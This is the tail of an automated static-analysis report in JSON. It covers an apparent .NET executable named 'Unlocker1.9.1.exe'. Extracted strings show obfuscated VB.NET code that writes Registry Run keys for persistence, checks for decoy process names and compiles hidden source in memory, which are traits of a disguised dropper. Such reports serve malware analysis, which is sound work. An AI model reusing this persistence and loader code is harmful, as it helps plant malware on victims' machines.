            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%COMMONPROGRAMFILES%\",\"%APPDATA%\")",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%PROGRAMFILES%\",\"%APPDATA%\")",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%WINDIR%\",\"%APPDATA%\")",
            "\t\t\tEnd If",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%COMMONPROGRAMFILES%\", System.Environment.GetEnvironmentVariable(\"COMMONPROGRAMFILES\"))",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%PROGRAMFILES%\", System.Environment.GetEnvironmentVariable(\"PROGRAMFILES\"))",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%APPDATA%\", System.Environment.GetEnvironmentVariable(\"APPDATA\"))",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%WINDIR%\", System.Environment.GetEnvironmentVariable(\"WINDIR\"))",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"%TEMP%\", System.Environment.GetEnvironmentVariable(\"TEMP\"))",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Replace(\"\\\\\", \"\\\")",
            "\t\t\tReturn ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath",
            "\t\tEnd Function",
            "\t\tPublic Shared Function fIbGewWwICUDaKUaWiyOVXgEyceLRkshOJJINxFMcDCSILDbFj(ByVal hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY As String, ByVal dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE As String, Optional ByVal NXSvLexRMBgpqoteXeJWVlprjJYQBikFhmzLfsgStQPqYpbfGg As Boolean = True, Optional ByVal rlEBXtSKGSixTHQniMOuOUcRwGHFKhnvZmlCGIzZogRyBVxDRN As Boolean = false) As Boolean",
            "\t\t\tIf hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY.Length = 0 Then Return False",
            "\t\t\tIf dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE.Length = 0 Then Return False",
            "\t\t\tDim eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV As Microsoft.Win32.RegistryKey",
            "\t\t\tDim eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue As String",
            "\t\t\tTry",
            "\t\t\t\tIf WpjZFOPNSDvDhutKNQIhvoZHJdGLYjERFqSonPwOzEeFQKcZvR() Then",
            "\t\t\t\t\tIf NXSvLexRMBgpqoteXeJWVlprjJYQBikFhmzLfsgStQPqYpbfGg Then",
            "\t\t\t\t\t\tNXSvLexRMBgpqoteXeJWVlprjJYQBikFhmzLfsgStQPqYpbfGg = False",
            "\t\t\t\t\t\trlEBXtSKGSixTHQniMOuOUcRwGHFKhnvZmlCGIzZogRyBVxDRN = True",
            "\t\t\t\t\tEnd If",
            "\t\t\t\tEnd If",
            "\t\t\t\tIf NXSvLexRMBgpqoteXeJWVlprjJYQBikFhmzLfsgStQPqYpbfGg Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", True)",
            "\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.GetValue(hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY, \"null\")",
            "\t\t\t\t\t\tIf eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue Is Nothing Or eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue <> dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE OR eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = \"null\" Then",
            "\t\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.SetValue(hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY, dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE)",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t\trlEBXtSKGSixTHQniMOuOUcRwGHFKhnvZmlCGIzZogRyBVxDRN = True",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tEnd If",
            "\t\t\t\tIf rlEBXtSKGSixTHQniMOuOUcRwGHFKhnvZmlCGIzZogRyBVxDRN Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", True)",
            "\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.GetValue(hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY, \"null\")",
            "\t\t\t\t\t\tIf eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue Is Nothing Or eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue <> dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE OR eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = \"null\" Then",
            "\t\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.SetValue(hPEYPGTdMMzzajvYrXuNZNKEWUqakqmyPQlnwUCfubhBJyeZaY, dOHOsTFVYbTrVzkfUofWjtdcQCdzMaIZLPpdbVnkHcCHEPShDE)",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t'",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tEnd If",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn false",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function RUMkOscYNhYPcmVVJuWsFTBSEIiWTNfczVtzvILZuwGQLoEWqK(ByVal len As Integer) As String",
            "\t\t\tRandomize()",
            "\t\t\tDim s As New System.Text.StringBuilder(\"\")",
            "\t\t\tDim b() As Char = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".ToCharArray()",
            "\t\t\tFor i As Integer = 1 To len",
            "\t\t\t\tRandomize()",
            "\t\t\t\tDim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1",
            "\t\t\t\ts.Append(b(z))",
            "\t\t\tNext",
            "\t\t\tReturn s.ToString",
            "\t\tEnd Function",
            "\t\t    Public Shared Function IsVCRunning() As Boolean",
            "        Try",
            "            Dim ProcessNames As String() = {\"NeroCheck\", \"lsasss\"}",
            "            For Each aProcessName As String In ProcessNames",
            "                If System.Diagnostics.Process.GetProcessesByName(aProcessName).Length >= 1 Then",
            "                    Return True",
            "                End If",
            "            Next",
            "        Catch ex As Exception",
            "        End Try",
            "        Return False",
            "    End Function",
            "\tEnd Class",
            "#End Region",
            "End Module",
            "BSJB",
            "v2.0.50727",
            "#Strings",
            "#GUID",
            "#Blob",
            "<Module>",
            "mscorlib",
            "Microsoft.VisualBasic",
            "MyApplication",
            "MyComputer",
            "MyProject",
            "MyWebServices",
            "ThreadSafeObjectProvider`1",
            "GBBzFpwEUutKzDuTwbZH",
            "Microsoft.VisualBasic.ApplicationServices",
            "ApplicationBase",
            ".ctor",
            "Microsoft.VisualBasic.Devices",
            "Computer",
            "System",
            "Object",
            ".cctor",
            "get_Computer",
            "m_ComputerObjectProvider",
            "get_Application",
            "m_AppObjectProvider",
            "User",
            "get_User",
            "m_UserObjectProvider",
            "get_WebServices",
            "m_MyWebServicesObjectProvider",
            "Application",
            "WebServices",
            "Equals",
            "GetHashCode",
            "Type",
            "GetType",
            "ToString",
            "Create__Instance__",
            "instance",
            "Dispose__Instance__",
            "get_GetInstance",
            "m_ThreadStaticValue",
            "GetInstance",
            "Main",
            "vQHxLVEErrSbnQjPmFRF",
            "System.IO",
            "Stream",
            "System.Reflection",
            "Assembly",
            "ddFNaCVBZqDqoiBxUEPVRctgCENkSvLrxRZOuppoteXeJjVlor",
            "jIlQzvkFvmzKssgStQcqYpbfGtqkDBXsRXTfiwTUdniMbtOhbR",
            "wGHFKunuZmlCFIzZngRyBVxDQavJwiKgfHoGrvWwICURnJiaWh",
            "fVjtccPQqzMoImLdpdaUmjHqBHDPfgCENkSvLrxRZOuppoteXe",
            "JjVlorjIlQzvkFvmzKssgStQcqYpbfGtqkDBXsRXTfiwTUdniM",
            "BMdrzBKidGIouOWMrmnlqbipGhgwmogGiNLthDsjxIqqddFNaC",
            "StreamReader",
            "qkDBXsRXTfiwTUdniMbtOhbRwGHFKunuZmlCFIzZngRyBVxDQa_ReadToEnd",
            "qkDBXsRXTfiwTUdniMbtOhbRwGHFKunuZmlCFIzZngRyBVxDQa01",
            "VBZqDqoiBxUEPVRctuQRbyfJYFMemcIDECHslsWxiyDGwWyeOK",
            "vmzKssgStQcqYpbfGtqkDBXsRXTfiwTUdniMbtOhbRwGHFKunu",
            "ZmlCFIzZngRyBVxDQavJwiKgfHoGrvWwICURnJiaWhyOjXgEyc",
            "eLekshNWXVaxELpDCSWYQpFwhPRlOTgdMZyyajvXrWuNmNYSkT",
            "System.CodeDom.Compiler",
            "CompilerResults",
            "JVVkorjIXQzhkFhlzvfsSStCOqKpNfFfqkDmJsEJGRiwFGPnhL",
            "PzszerqHKNFdslVEGaDIVfBOCnPlkMtLwBbBMGYWsOmfbmESnb",
            "lJEhiPjowmSbcafDJQuIHXadVtJCmUWqTYliReEEfnBcwbzRrS",
            "dXpYuepvrDUjqsCZUxzgmGODieechTZgxYXndgYwaFDkZtjaoy",
            "CompilerParameters",
            "EiTPDXOFTdMMylMivKqIuyYMKEWTpMkqmxBQlmwGBetNhzujQY",
            "ZtjaoyhhUUvERsNrQitifZroMvGMIUklHJSpWzQwDWeTyuutyj",
            "CNvuiiKSeHaGdvIvtnGDZJUZWhyzVWfEkOdKQjrhNIJHMwpxbD",
            "OqKpNfFfqkDmJsEJGRiwFGPnhLNtzTbRwrsqvgnuLllBrtlLnS",
            "aUmjGcBsoBRgCpyWRuwdxDLBgppnsQXeJVVkorjIXQzhkFhlzv",
            "mxBQlmwGBetNhzujQYZXcNHOrFEUYbSrHzjRToRVjtOcPCcyxa",
            "WTpMkqmxBQlmwGBetNhzujQYZXcNHOrFEUYbSrHzjRToRVjtOc",
            "qHKNFdslVEGaDIVfBOCnPlkMtLwBbBMGYWsOmfbmESnblJEhiP",
            "RVjtOcPCcyxaHZLPoPaUmjGcBsoBRgCpyWRuwdxDLBgppnsQXe",
            "System.ComponentModel",
            "EditorBrowsableAttribute",
            "EditorBrowsableState",
            "GeneratedCodeAttribute",
            "System.Diagnostics",
            "DebuggerHiddenAttribute",
            "Microsoft.VisualBasic.CompilerServices",
            "StandardModuleAttribute",
            "HideModuleNameAttribute",
            "System.ComponentModel.Design",
            "HelpKeywordAttribute",
            "System.Runtime.CompilerServices",
            "RuntimeHelpers",
            "GetObjectValue",
            "RuntimeTypeHandle",
            "GetTypeFromHandle",
            "Activator",
            "CreateInstance",
            "MyGroupCollectionAttribute",
            "System.Runtime.InteropServices",
            "ComVisibleAttribute",
            "ThreadStaticAttribute",
            "CompilerGeneratedAttribute",
            "GetManifestResourceStream",
            "AssemblyName",
            "GetName",
            "get_Name",
            "GetCallingAssembly",
            "GetManifestResourceNames",
            "ReadToEnd",
            "Exception",
            "CompilerErrorCollection",
            "get_Errors",
            "get_HasErrors",
            "ProjectData",
            "SetProjectError",
            "ClearProjectError",
            "get_CompiledAssembly",
            "set_GenerateInMemory",
            "System.Collections.Specialized",
            "StringCollection",
            "get_ReferencedAssemblies",
            "Strings",
            "CompareMethod",
            "Split",
            "AddRange",
            "VBCodeProvider",
            "String",
            "CodeDomProvider",
            "CompileAssemblyFromSource",
            "BindingFlags",
            "Binder",
            "InvokeMember",
            "STAThreadAttribute",
            "Debug_Other.vb",
            "CompilationRelaxationsAttribute",
            "RuntimeCompatibilityAttribute",
            "Unlocker1.9.1",
            "Unlocker1.9.1.exe",
            "MyTemplate",
            "8.0.0.0",
            "My.Computer",
            "My.User",
            "My.Application",
            "My.WebServices",
            "4System.Web.Services.Protocols.SoapHttpClientProtocol",
            "Create__Instance__",
            "Dispose__Instance__",
            "WrapNonExceptionThrows",
            "_CorExeMain",
            "mscoree.dll"
        ],
        "file": {
            "Unlocker1.9.1.exe": "Executable",
            "mscoree.dll": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.748597",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsNET_EXE"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer.yar": "NETexecutableMicrosoft"
        }
    ]
}
